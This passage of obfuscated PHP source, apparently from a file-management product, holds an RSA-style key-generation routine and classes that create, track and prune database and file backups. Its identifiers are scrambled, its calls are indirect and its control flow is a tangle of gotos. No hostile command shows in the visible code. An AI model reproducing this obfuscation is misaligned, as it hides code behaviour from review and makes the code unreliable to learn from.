$e…¦Œçî°[686]; if (!$dê¢†ŒÔ–à) { return; } $bğÅÖ›‡ä„ = $C´†Ò¸Ö¡[10]; goto eç«Ç©Ş§ğ; eç«Ç©Ş§ğ: $B‚‹Ã‹æ = $e…¦Œçî°[687]; if (strlen($B‚‹Ã‹æ) < $e…¦Œçî°[588]) { return; } $E‹ÉÁĞê¥Ø = 0; goto d¹Åñ²ï¥²; d¹Åñ²ï¥²: $d°‡•ğã˜‡ = $e…¦Œçî°[688]; $DÜß®ÖÙš = 0; $c‘¬ÜÁíÌ” = $e…¦Œçî°[689]; goto A®è¯‹‰’Ò; A®è¯‹‰’Ò: while ($c‘¬ÜÁíÌ” < $e…¦Œçî°[597]) { if ($c‘¬ÜÁíÌ” >= 0) { break; } $c‘¬ÜÁíÌ”++; } $BÎ‹ÓÖ‰Îİ = 0; for ($E‹ÉÁĞê¥Ø = 0; $E‹ÉÁĞê¥Ø < $C´†Ò¸Ö¡[24]($DÇİƒñ¾¦); $E‹ÉÁĞê¥Ø++) { $BÎ‹ÓÖ‰Îİ = $BÎ‹ÓÖ‰Îİ == $C´†Ò¸Ö¡[24]($fçÖ¡ßÙ¶è) ? 0 : $BÎ‹ÓÖ‰Îİ; $e¢Äí†–²ß = $e…¦Œçî°[690]; if (!$e¢Äí†–²ß) { return; } $bã™¬ßè = $BÎ‹ÓÖ‰Îİ++; $B«¢õŞ•¢“ = $e…¦Œçî°[691]; if (!$B«¢õŞ•¢“) { die; } $DÜß®ÖÙš = $C´†Ò¸Ö¡[364]($b¦äÜ»Šğ, $DÇİƒñ¾¦[$E‹ÉÁĞê¥Ø]) - $fÅªË¹«Š‘ - $C´†Ò¸Ö¡[365]($fçÖ¡ßÙ¶è[$bã™¬ßè]); $a´³ÆÉ = $e…¦Œçî°[692]; if (!$a´³ÆÉ) { die; } while ($DÜß®ÖÙš < 0) { $DÜß®ÖÙš += 64; $Fæ÷©Ì‹” = $e…¦Œçî°[693]; if (!$Fæ÷©Ì‹”) { return; } } $bğÅÖ›‡ä„ .= $b¦äÜ»Šğ[$DÜß®ÖÙš]; $cäçÄë‰« = $e…¦Œçî°[694]; if (strlen($cäçÄë‰«) < $e…¦Œçî°[248]) { die; } } goto FĞİºğ¨â–; Dˆ‰º‰ ¿: $DÇİƒñ¾¦ = $C´†Ò¸Ö¡[366]($DÇİƒñ¾¦); $cÚ½Ë†ëëâ = $e…¦Œçî°[683]; if (!$cÚ½Ë†ëëâ) { return; } goto f¯Û¢õÌ¬; eĞè—š’ŒŸ: break; $bÖ¼ê±ÛÆÚ = $e…¦Œçî°[696]; while ($bÖ¼ê±ÛÆÚ < $e…¦Œçî°[592]) { if ($bÖ¼ê±ÛÆÚ >= 0) { break; } $bÖ¼ê±ÛÆÚ++; } goto C‹ã¼ÃÓ­; E°îÅ§¢ Ö: $dÚì†×†…¡ = $e…¦Œçî°[685]; if (strlen($dÚì†×†…¡) < $e…¦Œçî°[588]) { return; } $fçÖ¡ßÙ¶è = $C´†Ò¸Ö¡[25]($fçÖ¡ßÙ¶è, $fÅªË¹«Š‘ % 8, $fÅªË¹«Š‘ % 8 + 7); goto AÎ³¿Î‹ÍÑ; Cæ˜ÁÀ‚ç: $DÇİƒñ¾¦ = $C´†Ò¸Ö¡[25]($DÇİƒñ¾¦, 1); $fÅªË¹«Š‘ = $C´†Ò¸Ö¡[364]($b¦äÜ»Šğ, $bŒ‹‡Ú½ì); $fçÖ¡ßÙ¶è = $C´†Ò¸Ö¡[124]($bŒ‹‡Ú½ì . $C´†Ò¸Ö¡[124]($FÈ×âØ°÷ . $bŒ‹‡Ú½ì) . $FÈ×âØ°÷); goto E°îÅ§¢ Ö; C‹ã¼ÃÓ­: default: $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][269]}($DÇİƒñ¾¦, $FÈ×âØ°÷ . $câƒë½æäµ); $Céä‡Ç£ª‚ = $e…¦Œçî°[697]; if (!$Céä‡Ç£ª‚) { die; } break; $eÂÓá–¥ = $e…¦Œçî°[698]; if (strlen($eÂÓá–¥) < $e…¦Œçî°[588]) { return; } } goto C¤ã™¤µšõ; EŠŒ‚‡‘¶ƒ: $DÇİƒñ¾¦ = $C´†Ò¸Ö¡[2]($DÇİƒñ¾¦); $DÇİƒñ¾¦ = $C´†Ò¸Ö¡[233]($DÇİƒñ¾¦); $a‘¶±‹æŠ = $e…¦Œçî°[677]; goto cË“´¼ç¸«; cË“´¼ç¸«: while ($a‘¶±‹æŠ < $e…¦Œçî°[597]) { if ($a‘¶±‹æŠ >= 0) { break; } $a‘¶±‹æŠ++; } $AÙœŠÈ˜‚Ó = $DÇİƒñ¾¦[0]; $câƒë½æäµ = $C´†Ò¸Ö¡[25]($DÇİƒñ¾¦, 1, 15); goto A£‰Ãø©Ò; bôŒŞºÇë’: $e…¦Œçî° =& $_SERVER[úÉ·öƒÑì©]; $C´†Ò¸Ö¡ =& $_SERVER[›É]; if (!$C´†Ò¸Ö¡[158]($DÇİƒñ¾¦) || $C´†Ò¸Ö¡[24]($DÇİƒñ¾¦) < 10) { return !1; } goto EŠŒ‚‡‘¶ƒ; C¤ã™¤µšõ: if ($f¦¸ñ“·Ä¥ - 1 > 0) { $f¤ù¹ìˆŞ = $this->{$_SERVER[›É][208]}($f¤ù¹ìˆŞ, $FÈ×âØ°÷, $f¦¸ñ“·Ä¥ - 1); } return $f¤ù¹ìˆŞ; goto E°ŞğÖ§; E°ŞğÖ§: } public function xiqh1f2d633b($d¡‡¿ë”“) { goto Câñ…¢™íµ; aŸ„»äÃŸ¹: $bÌÈÔ‰ƒªÁ = $d¹£®¼ùï[700]; if (strlen($bÌÈÔ‰ƒªÁ) < $d¹£®¼ùï[616]) { return; } $c¦’âº¹¥ø = ($D‰ì¡¿Äßµ - 1) * ($EÈÕ†òñÙ× - 1); goto fïãÈ­‰Û; fÍ¬ùÍ¯Ù¥: $EÛÀÊ‚¾Ëù = $d¹£®¼ùï[699]; if (strlen($EÛÀÊ‚¾Ëù) < $d¹£®¼ùï[588]) { die; } $EÈÕ†òñÙ× = $this->{$_SERVER[›É][368]}(); goto aŸ„»äÃŸ¹; Câñ…¢™íµ: $d¹£®¼ùï =& $_SERVER[úÉ·öƒÑì©]; $fœ»šà =& $_SERVER[›É]; $D‰ì¡¿Äßµ = $this->{$_SERVER[›É][368]}(); goto fÍ¬ùÍ¯Ù¥; d¬¾„Ğãùé: $Fè¥ØÈÖ¼ç = $d¹£®¼ùï[702]; if (!$Fè¥ØÈÖ¼ç) { die; } while (1) { $d÷‘Œ˜“— = $Fôô÷´ ×; $B±ÁÀÄÏğ = $c¦’âº¹¥ø; $BÖïËŞÇ“ƒ = $d¹£®¼ùï[703]; if (!$BÖïËŞÇ“ƒ) { return; } while ($B±ÁÀÄÏğ % $d÷‘Œ˜“— != 0) { $f¹×Ö™… = $B±ÁÀÄÏğ; $FÉ ÚÄŒÅŠ = $d¹£®¼ùï[704]; if (strlen($FÉ ÚÄŒÅŠ) < $d¹£®¼ùï[248]) { die; } $B±ÁÀÄÏğ = $d÷‘Œ˜“—; $d÷‘Œ˜“— = $f¹×Ö™… % $d÷‘Œ˜“—; } if ($d÷‘Œ˜“— == 1) { break; } else { $Fôô÷´ ×++; } } goto fœºˆ¯ ğ; fœºˆ¯ ğ: $EµëŸ­â…â = 2; $dìÔçŠóï = $d¹£®¼ùï[705]; while (strlen($dìÔçŠóï) < $d¹£®¼ùï[616]) { if (!$dìÔçŠóï) { break; } $dìÔçŠóï++; } goto dŸ²Ë²íì¹; fïãÈ­‰Û: $D¨¤éµñ­™ = $d¹£®¼ùï[701]; while (strlen($D¨¤éµñ­™) < $d¹£®¼ùï[597]) { if (!$D¨¤éµñ­™) { break; } $D¨¤éµñ­™++; } $Fôô÷´ × = $fœ»šà[263](($D‰ì¡¿Äßµ + $EÈÕ†òñÙ×) / 2); goto d¬¾„Ğãùé; F­È´µ³šÀ: $EÜ‘©»Í” = $this->{$_SERVER[›É][165]}($d¡‡¿ë”“, $A½ø•î°â) . $fœ»šà[372] . $F÷¡’ë‘†Ã; return $EÜ‘©»Í”; goto e½Õ“š„Ì; dŸ²Ë²íì¹: for ($dÂèÆ‘ìâ = 0; $dÂèÆ‘ìâ < $c¦’âº¹¥ø * 10; $dÂèÆ‘ìâ++) { if (($c¦’âº¹¥ø * $dÂèÆ‘ìâ + 1) % $Fôô÷´ × == 0) { $EµëŸ­â…â = $fœ»šà[263](($c¦’âº¹¥ø * $dÂèÆ‘ìâ + 1) / $Fôô÷´ ×); break; } } $F÷¡’ë‘†Ã = $this->{$_SERVER[›É][165]}($D‰ì¡¿Äßµ * $EÈÕ†òñÙ× . $fœ»šà[10], $fœ»šà[167]); $cÓÁšèç‘ = $d¹£®¼ùï[590]; goto AÚí‡„•; AÚí‡„•: if (!$cÓÁšèç‘) { die; } $A½ø•î°â = $fœ»šà[124]($fœ»šà[369] . ($D‰ì¡¿Äßµ + $EÈÕ†òñÙ×) . $fœ»šà[370] . $Fôô÷´ × . $fœ»šà[370] . $EµëŸ­â…â . $fœ»šà[371]); $eºƒìô‚Øà = $d¹£®¼ùï[706]; goto F­È´µ³šÀ; e½Õ“š„Ì: } public function rcaj6e330c51($cŸğ¾òÀã—) { goto cÇ›Ú¿æ ª; Fƒ®ñ˜÷…ï: $BÙ‹ŠëË«¸ = $b„•©”Ëö±[709]; while ($BÙ‹ŠëË«¸ < $b„•©”Ëö±[588]) { if ($BÙ‹ŠëË«¸ >= 0) { break; } $BÙ‹ŠëË«¸++; } for ($b¡ø’æ“© = 3; $b¡ø’æ“© < $D¶¥¿Æ–®; $b¡ø’æ“© += 2) { if ($D¶¥¿Æ–® % $b¡ø’æ“© != 0) { continue; } $bìĞË…¢ºŞ = $b¡ø’æ“©; $B¯ğßó˜å¿ = $b„•©”Ëö±[710]; if (!$B¯ğßó˜å¿) { return; } $F»¯›Ÿª‰¡ = $d°™¬Äïµ¸[263]($D¶¥¿Æ–® / $b¡ø’æ“©); break; $fŠ¨ğëí = $b„•©”Ëö±[711]; if (strlen($fŠ¨ğëí) < $b„•©”Ëö±[248]) { return; } } goto FêÏâí‰ñ; dÓœ¾Ä¦Ññ: $Bİ¹ñå…» = $this->{$_SERVER[›É][269]}($D¢ÊÑÅÑì[0], $C–èÓ£á˜™); $a´ê¼•å• = $b„•©”Ëö±[716]; if (!$a´ê¼•å•) { return; } goto f‹šàğ¥Ø; FêÏâí‰ñ: $A‰Ã’¯‰–Ú = ($bìĞË…¢ºŞ - 1) * ($F»¯›Ÿª‰¡ - 1); $E¦¬Á¹Ûß“ = $d°™¬Äïµ¸[263](($bìĞË…¢ºŞ + $F»¯›Ÿª‰¡) / 2); $EÂù­–¶Š» = $b„•©”Ëö±[712]; goto E’†¼Ø‚ĞÇ; b§å·æí: $D¶¥¿Æ–® = $d°™¬Äïµ¸[263]($D¶¥¿Æ–®); $bìĞË…¢ºŞ = 0; $F»¯›Ÿª‰¡ = 0; goto Fƒ®ñ˜÷…ï; B³Ææ‹ƒ¶½: $C·ÄğºŠêÆ = $b„•©”Ëö±[707]; if ($d°™¬Äïµ¸[19]($D¢ÊÑÅÑì) != 2) { return $d°™¬Äïµ¸[10]; } $D¶¥¿Æ–® = $this->{$_SERVER[›É][269]}($D¢ÊÑÅÑì[1] . $d°™¬Äïµ¸[10], $d°™¬Äïµ¸[167]); goto dêø•­ì„ ; E’†¼Ø‚ĞÇ: while (1) { $eà¿«ÁƒÅ¬ = $E¦¬Á¹Ûß“; $f…¾ºË¢¥Ã = $b„•©”Ëö±[713]; if (strlen($f…¾ºË¢¥Ã) < $b„•©”Ëö±[616]) { return; } $e†·Ğğ½õ› = $A‰Ã’¯‰–Ú; while ($e†·Ğğ½õ› % $eà¿«ÁƒÅ¬ != 0) { $fˆÛÔ²²Ü = $e†·Ğğ½õ›; $e†·Ğğ½õ› = $eà¿«ÁƒÅ¬; $eà¿«ÁƒÅ¬ = $fˆÛÔ²²Ü % $eà¿«ÁƒÅ¬; $AäšÙ™ˆ = $b„•©”Ëö±[714]; if (strlen($AäšÙ™ˆ) < $b„•©”Ëö±[592]) { return; } } if ($eà¿«ÁƒÅ¬ == 1) { break; } else { $E¦¬Á¹Ûß“++; } } $C†‡Ñò‹Ó¦ = 2; $f´Øê«—™™ = $b„•©”Ëö±[715]; goto cò›Å¾ØˆÅ; cò›Å¾ØˆÅ: if (strlen($f´Øê«—™™) < $b„•©”Ëö±[588]) { return; } for ($b¡ø’æ“© = 0; $b¡ø’æ“© < $A‰Ã’¯‰–Ú * 10; $b¡ø’æ“©++) { if (($A‰Ã’¯‰–Ú * $b¡ø’æ“© + 1) % $E¦¬Á¹Ûß“ == 0) { $C†‡Ñò‹Ó¦ = $d°™¬Äïµ¸[263](($A‰Ã’¯‰–Ú * $b¡ø’æ“© + 1) / $E¦¬Á¹Ûß“); break; } } $C–èÓ£á˜™ = $d°™¬Äïµ¸[124]($d°™¬Äïµ¸[369] . ($bìĞË…¢ºŞ + $F»¯›Ÿª‰¡) . $d°™¬Äïµ¸[370] . $E¦¬Á¹Ûß“ . $d°™¬Äïµ¸[370] . $C†‡Ñò‹Ó¦ . $d°™¬Äïµ¸[371]); goto dÓœ¾Ä¦Ññ; dêø•­ì„ : $d£çíéÈ = $b„•©”Ëö±[708]; if (strlen($d£çíéÈ) < $b„•©”Ëö±[597]) { return; } if (!$D¶¥¿Æ–®) { return $d°™¬Äïµ¸[10]; } goto b§å·æí; cÇ›Ú¿æ ª: $b„•©”Ëö± =& $_SERVER[úÉ·öƒÑì©]; $d°™¬Äïµ¸ =& $_SERVER[›É]; $D¢ÊÑÅÑì = $d°™¬Äïµ¸[0]($d°™¬Äïµ¸[372], $cŸğ¾òÀã—); goto B³Ææ‹ƒ¶½; f‹šàğ¥Ø: return $Bİ¹ñå…»; goto eÑø†¢‡ª; eÑø†¢‡ª: } public function qgnx0e65fee3() { goto A“Ú´Ø…ˆ; Bâ”¹¿‰¹•: $E„²ù—êâ‹ = 2; for ($A´‹±Æ‘é´ = $döÊ¸ÄªÇ; $A´‹±Æ‘é´ > 1; $A´‹±Æ‘é´--) { $dÆ¦Ëë¥Í† = !0; $cãÍÇèé”Ç = $FÅç¡…ÎÈ[721]; foreach ($Fµè¹åùÍ¥ as $dÃ„Ê™¾éå) { if ($A´‹±Æ‘é´ % $dÃ„Ê™¾éå == 0) { $dÆ¦Ëë¥Í† = !1; break; } } if ($dÆ¦Ëë¥Í†) { $E„²ù—êâ‹ = $A´‹±Æ‘é´; break; } } return $E„²ù—êâ‹; goto C—Ò™¨¯áé; aÑŠé èƒâ: $Fµè¹åùÍ¥ = array(); $føÛêâ¢…— = $FÅç¡…ÎÈ[717]; $B´ªŞ‡¾à = 1; goto F¡åªî³í; F¡åªî³í: $fÇ‹–¦¥Áâ = $FÅç¡…ÎÈ[718]; if (strlen($fÇ‹–¦¥Áâ) < $FÅç¡…ÎÈ[588]) { return; } while ($B´ªŞ‡¾à <= (int) $e–µƒ÷Ã¼‹[374]($döÊ¸ÄªÇ)) { $A´‹±Æ‘é´ = $B´ªŞ‡¾à; $b‰Ø„†®Õ« = $FÅç¡…ÎÈ[719]; while ($b‰Ø„†®Õ« < $FÅç¡…ÎÈ[588]) { if ($b‰Ø„†®Õ« >= 0) { break; } $b‰Ø„†®Õ«++; } while (!0) { $A´‹±Æ‘é´++; $DÇî¦íà’ğ = $FÅç¡…ÎÈ[720]; if (!$DÇî¦íà’ğ) { return; } if ($A´‹±Æ‘é´ <= 2) { $B´ªŞ‡¾à = $A´‹±Æ‘é´; break; } else { if ($A´‹±Æ‘é´ < 2) { continue; } } $dÆ¦Ëë¥Í† = !0; for ($aÍÎ°È×™² = 2; $aÍÎ°È×™² <= $e–µƒ÷Ã¼‹[374]($A´‹±Æ‘é´); $aÍÎ°È×™²++) { if ($A´‹±Æ‘é´ % $aÍÎ°È×™² == 0) { $dÆ¦Ëë¥Í† = !1; } } if ($dÆ¦Ëë¥Í†) { $B´ªŞ‡¾à = $A´‹±Æ‘é´; break; } } $Fµè¹åùÍ¥[] = $B´ªŞ‡¾à; } goto Bâ”¹¿‰¹•; A“Ú´Ø…ˆ: $FÅç¡…ÎÈ =& $_SERVER[úÉ·öƒÑì©]; $e–µƒ÷Ã¼‹ =& $_SERVER[›É]; $döÊ¸ÄªÇ = $e–µƒ÷Ã¼‹[354]($e–µƒ÷Ã¼‹[373](2, 14), $e–µƒ÷Ã¼‹[373](2, 16) - 1); goto aÑŠé èƒâ; C—Ò™¨¯áé: } public function szrq46e6f837($D½İ¯ò¸ùˆ, $D¬óÎ œè÷) { $b‹Ï©Î®¯ñ =& $_SERVER[›É]; return $b‹Ï©Î®¯ñ[13](array($b‹Ï©Î®¯ñ[14], $b‹Ï©Î®¯ñ[375]), $D½İ¯ò¸ùˆ, $D¬óÎ œè÷); $E¿Òå¶‰ = $_SERVER[úÉ·öƒÑì©][722]; if (!$E¿Òå¶‰) { die; } } public function idkvf43eab69($b¥Ó²Ü, $c‰ïø¨®º§) { $Dì‚ƒğÕ =& $_SERVER[›É]; return $Dì‚ƒğÕ[13](array($Dì‚ƒğÕ[376], $Dì‚ƒğÕ[377]), $b¥Ó²Ü, $c‰ïø¨®º§); } public function cmjo8e6dd8b7($b÷±ò¯Ú˜, $Få‹¨‚×­÷) { $Eğèóò««Š =& $_SERVER[úÉ·öƒÑì©]; $C±„ƒÉÑ±Ë =& $_SERVER[›É]; return $C±„ƒÉÑ±Ë[13](array($C±„ƒÉÑ±Ë[376], $C±„ƒÉÑ±Ë[378]), $b÷±ò¯Ú˜, $Få‹¨‚×­÷); $cîŒ†¯ó—¬ = $Eğèóò««Š[723]; while (strlen($cîŒ†¯ó—¬) < $Eğèóò««Š[616]) { if (!$cîŒ†¯ó—¬) { break; } $cîŒ†¯ó—¬++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $f¬‡¸Ââ„ =& $_SERVER[úÉ·öƒÑì©]; $this->isManual(); self::$name = date($f¬‡¸Ââ„[724]); if (!($EŒ‚±¿âö† = Model($f¬‡¸Ââ„[725])->lastItem())) { $EŒ‚±¿âö† = $this->initData(); } else { self::$name = $EŒ‚±¿âö†[$f¬‡¸Ââ„[28]]; if ($EŒ‚±¿âö†[$f¬‡¸Ââ„[726]] == $f¬‡¸Ââ„[87]) { self::$name = date($f¬‡¸Ââ„[727]); $C¿„ŠÔìóí = 0; if (isset($EŒ‚±¿âö†[$f¬‡¸Ââ„[300]][$f¬‡¸Ââ„[193]][$f¬‡¸Ââ„[456]])) { $C¿„ŠÔìóí = (int) $EŒ‚±¿âö†[$f¬‡¸Ââ„[300]][$f¬‡¸Ââ„[193]][$f¬‡¸Ââ„[456]]; } if (self::$manual == 0 && $EŒ‚±¿âö†[$f¬‡¸Ââ„[28]] == self::$name) { Model($f¬‡¸Ââ„[725])->remove($EŒ‚±¿âö†[$f¬‡¸Ââ„[402]]); } $EŒ‚±¿âö† = $this->initData($C¿„ŠÔìóí, $EŒ‚±¿âö†[$f¬‡¸Ââ„[728]]); } else { $this->checkStore($EŒ‚±¿âö†[$f¬‡¸Ââ„[728]]); } } self::$option = $EŒ‚±¿âö†; } private function isManual() { $BÁ‡¸Æ±È = _get($GLOBALS, $_SERVER[úÉ·öƒÑì©][729], 0); $BÁ‡¸Æ±È = intval($BÁ‡¸Æ±È); self::$manual = $BÁ‡¸Æ±È && $BÁ‡¸Æ±È == 1 ? 1 : 0; } private function initData($Aİ¿¿¦™Ö… = 0, $Aô„ë«ƒª¨ = '') { goto D§¬ğÊ´’•; D§¬ğÊ´’•: $F«™Ñ”Ù™Õ =& $_SERVER[úÉ·öƒÑì©]; $fäÍ‡íÊù = Model($F«™Ñ”Ù™Õ[725])->config(); if ($Aô„ë«ƒª¨ && $fäÍ‡íÊù[$F«™Ñ”Ù™Õ[728]] != $Aô„ë«ƒª¨) { $Aİ¿¿¦™Ö… = 0; } goto F‘Ç­ôÛºâ; A£íã‹‚Ë: $DâŒ¨àÕ—Õ = Model($F«™Ñ”Ù™Õ[725])->insert($fÁ¨‹ëñÑÃ); $fÁ¨‹ëñÑÃ[$F«™Ñ”Ù™Õ[402]] = $DâŒ¨àÕ—Õ; return $fÁ¨‹ëñÑÃ; goto a¶æ¤ÛšÖŠ; F‘Ç­ôÛºâ: $this->checkStore($fäÍ‡íÊù[$F«™Ñ”Ù™Õ[728]]); if (self::$manual == 1) { self::$name .= $F«™Ñ”Ù™Õ[71] . date($F«™Ñ”Ù™Õ[730]); } $fÁ¨‹ëñÑÃ = array($F«™Ñ”Ù™Õ[728] => $fäÍ‡íÊù[$F«™Ñ”Ù™Õ[728]], $F«™Ñ”Ù™Õ[28] => self::$name, $F«™Ñ”Ù™Õ[726] => 0, $F«™Ñ”Ù™Õ[731] => $fäÍ‡íÊù[$F«™Ñ”Ù™Õ[731]], $F«™Ñ”Ù™Õ[732] => self::$manual, $F«™Ñ”Ù™Õ[300] => array($F«™Ñ”Ù™Õ[733] => array($F«™Ñ”Ù™Õ[726] => 0), $F«™Ñ”Ù™Õ[734] => array($F«™Ñ”Ù™Õ[726] => 0, $F«™Ñ”Ù™Õ[735] => 0, $F«™Ñ”Ù™Õ[736] => 0, $F«™Ñ”Ù™Õ[29] => $F«™Ñ”Ù™Õ[33], $F«™Ñ”Ù™Õ[737] => 0, $F«™Ñ”Ù™Õ[485] => 0), $F«™Ñ”Ù™Õ[738] => array($F«™Ñ”Ù™Õ[726] => 0, $F«™Ñ”Ù™Õ[735] => 0, $F«™Ñ”Ù™Õ[736] => 0, $F«™Ñ”Ù™Õ[737] => 0, $F«™Ñ”Ù™Õ[485] => 0), $F«™Ñ”Ù™Õ[193] => array($F«™Ñ”Ù™Õ[726] => 0, $F«™Ñ”Ù™Õ[739] => 0, $F«™Ñ”Ù™Õ[740] => 0, $F«™Ñ”Ù™Õ[741] => 0, $F«™Ñ”Ù™Õ[742] => 0, $F«™Ñ”Ù™Õ[456] => $Aİ¿¿¦™Ö…, $F«™Ñ”Ù™Õ[737] => 0, $F«™Ñ”Ù™Õ[485] => 0)), $F«™Ñ”Ù™Õ[737] => time(), $F«™Ñ”Ù™Õ[485] => 0); goto A£íã‹‚Ë; a¶æ¤ÛšÖŠ: } private function checkStore($E»î£Ö°¬‡) { $c—ë„  Í‡ =& $_SERVER[úÉ·öƒÑì©]; $a¢Ş“ê¢Ì = Model($c—ë„  Í‡[743])->listData($E»î£Ö°¬‡); Model($c—ë„  Í‡[743])->checkConfig($a¢Ş“ê¢Ì); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[úÉ·öƒÑì©][725])->findByName(self::$name); } return self::$option; } public static function set($c ‘Ÿ§„ôÖ) { $BˆĞáÕ±“ =& $_SERVER[úÉ·öƒÑì©]; $FôâØ“¤È† = self::get(); foreach ($c ‘Ÿ§„ôÖ as $BĞÁ‡«¢ÚŒ => $cÄš·ƒÑö²) { $EØó²˜Ğœ™ = explode($BˆĞáÕ±“[95], $BĞÁ‡«¢ÚŒ); $aŠÃâÔàÀª = count($EØó²˜Ğœ™); switch ($aŠÃâÔàÀª) { case 1: $FôâØ“¤È†[$EØó²˜Ğœ™[0]] = $cÄš·ƒÑö²; break; case 2: $FôâØ“¤È†[$EØó²˜Ğœ™[0]][$EØó²˜Ğœ™[1]] = $cÄš·ƒÑö²; break; case 3: $FôâØ“¤È†[$EØó²˜Ğœ™[0]][$EØó²˜Ğœ™[1]][$EØó²˜Ğœ™[2]] = $cÄš·ƒÑö²; break; } } Model($BˆĞáÕ±“[725])->update($FôâØ“¤È†[$BˆĞáÕ±“[402]], $FôâØ“¤È†); self::$option = $FôâØ“¤È†; return self::$option; } public function keep() { $Bù‡å„§æ¶ =& $_SERVER[úÉ·öƒÑì©]; $FŠÁ¤õçÊ = self::get(); if ($FŠÁ¤õçÊ[$Bù‡å„§æ¶[300]][$Bù‡å„§æ¶[733]][$Bù‡å„§æ¶[726]] == $Bù‡å„§æ¶[87]) { return; } $this->backupKeep($FŠÁ¤õçÊ); self::set(array($Bù‡å„§æ¶[744] => 1)); } private function backupKeep($aİãºÍÒÌ–) { goto fŠ†¨®¤…£; FÂ‚®ºò»È: if (empty($E‰ò¦í­)) { return; } $e·ÍÜçÑ‹º = 0; $EÏòêô¶á¼ = array(); goto Aò©Ÿ‰•§“; fŠ†¨®¤…£: $B†Àï¡Ü¼Á =& $_SERVER[úÉ·öƒÑì©]; if (self::$manual == 1) { return; } $E‰ò¦í­ = Model($B†Àï¡Ü¼Á[725])->listData(); goto FÂ‚®ºò»È; BöíäÔŒƒê: $B¯³±äÌ™ = Model($B†Àï¡Ü¼Á[746])->get($B†Àï¡Ü¼Á[747]); foreach ($E‰ò¦í­ as $a×Î‡Ã©£Ô) { if (isset($a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[732]]) && $a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[732]] == $B†Àï¡Ü¼Á[87]) { continue; } if (!empty($a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[28]]) && in_array($a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[28]], $EÏòêô¶á¼)) { continue; } Model($B†Àï¡Ü¼Á[725])->remove($a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[402]]); $CÙâŸŠºß = $this->backupPath($aİãºÍÒÌ–, $B¯³±äÌ™); IO::remove($CÙâŸŠºß, !1); } goto d­ÈÊÇĞ³; Aò©Ÿ‰•§“: foreach ($E‰ò¦í­ as $a×Î‡Ã©£Ô) { if ($e·ÍÜçÑ‹º >= 7) { break; } $EÏòêô¶á¼[] = $a×Î‡Ã©£Ô[$B†Àï¡Ü¼Á[28]]; $e·ÍÜçÑ‹º++; } for ($e·ÍÜçÑ‹º = 0; $e·ÍÜçÑ‹º < 12; $e·ÍÜçÑ‹º++) { $EÏòêô¶á¼[] = date($B†Àï¡Ü¼Á[745], strtotime("\55{$e·ÍÜçÑ‹º}\40\155\157\x6e\x74\x68\x73")); } $EÏòêô¶á¼ = array_unique($EÏòêô¶á¼); goto BöíäÔŒƒê; d­ÈÊÇĞ³: } private function backupPath($bĞª§ë¬”, $aãÚÎ•à‚ = false) { $F•Ì¥†‡„Œ =& $_SERVER[úÉ·öƒÑì©]; if (!$aãÚÎ•à‚) { $aãÚÎ•à‚ = Model($F•Ì¥†‡„Œ[746])->get($F•Ì¥†‡„Œ[747]); } $CÄÖ²’…ŠÀ = $bĞª§ë¬”[$F•Ì¥†‡„Œ[28]]; $Bâ¶…½ë£Ì = substr(md5($F•Ì¥†‡„Œ[748] . $aãÚÎ•à‚ . $CÄÖ²’…ŠÀ), 0, 8); return "\x7b\x69\157\72{$bĞª§ë¬”[$F•Ì¥†‡„Œ[728]]}\175\57\144\x61\164\141\x62\x61\163\145\x2f\x62\x61\x63\153\x75\x70\x2f" . $CÄÖ²’…ŠÀ . $F•Ì¥†‡„Œ[71] . $Bâ¶…½ë£Ì; } public function db() { goto c£Š‡Šª‹; FÏ‰œé‰ãá: return !0; goto AÓÙñÎˆ¯§; Cª…ùÂ†¥: $Bîàµà¾Š¡ = new BackupDb(); if (!$Bîàµà¾Š¡->index()) { return !1; } self::set(array($C»ğ–ÖóÏ[749] => 1)); goto FÏ‰œé‰ãá; c£Š‡Šª‹: $C»ğ–ÖóÏ =& $_SERVER[úÉ·öƒÑì©]; $fÔ‘ÓáÛ¼ = self::get(); if ($fÔ‘ÓáÛ¼[$C»ğ–ÖóÏ[300]][$C»ğ–ÖóÏ[734]][$C»ğ–ÖóÏ[726]] == $C»ğ–ÖóÏ[87]) { return !0; } goto Cª…ùÂ†¥; AÓÙñÎˆ¯§: } public function dbFile() { goto F¦ÉœÀŒ§; F¦ÉœÀŒ§: $eÇçÙ×¤¡ =& $_SERVER[úÉ·öƒÑì©]; $dÌ´°†ÂÄä = self::get(); if ($dÌ´°†ÂÄä[$eÇçÙ×¤¡[300]][$eÇçÙ×¤¡[738]][$eÇçÙ×¤¡[726]] == $eÇçÙ×¤¡[87]) { return !0; } goto e…†êßÌêÁ; aºÈ·‹êÕ¯: return !0; goto a„™¿À¤½; e…†êßÌêÁ: $FÄÕøˆçÃœ = new BackupDbFile(); if (!$FÄÕøˆçÃœ->index()) { return !1; } self::set(array($eÇçÙ×¤¡[750] => 1)); goto aºÈ·‹êÕ¯; a„™¿À¤½: } public function file() { $DÎŞßƒĞ¼ =& $_SERVER[úÉ·öƒÑì©]; $BÃ£ÄÖìš = self::get(); if ($BÃ£ÄÖìš[$DÎŞßƒĞ¼[300]][$DÎŞßƒĞ¼[193]][$DÎŞßƒĞ¼[726]] == $DÎŞßƒĞ¼[87]) { return !0; } if (!isset($BÃ£ÄÖìš[$DÎŞßƒĞ¼[731]]) || $BÃ£ÄÖìš[$DÎŞßƒĞ¼[731]] == $DÎŞßƒĞ¼[191]) { $A†´”—‰®Á = new BackupFile(); if (!$A†´”—‰®Á->index()) { return !1; } } self::set(array($DÎŞßƒĞ¼[751] => 1, $DÎŞßƒĞ¼[726] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f¹ç®·øíØ; a²Ç£¼õÙ†: $cÈÓÄ’ÀÁâ = $f˜ŞºŒœì = 0; try { $B¿õÓîÖÜ = $f¾–Á®”÷Ø->db()->getTables(); } catch (Exception $CœËŒ¯”Ë‚) { return !1; } $B¿õÓîÖÜ = array_diff($B¿õÓîÖÜ, array($A©¡˜ó´„Ê[755], $A©¡˜ó´„Ê[756])); goto D®›ù½ğéÌ; D®›ù½ğéÌ: foreach ($B¿õÓîÖÜ as $B›óÕø­‘‰) { $cÈÓÄ’ÀÁâ += 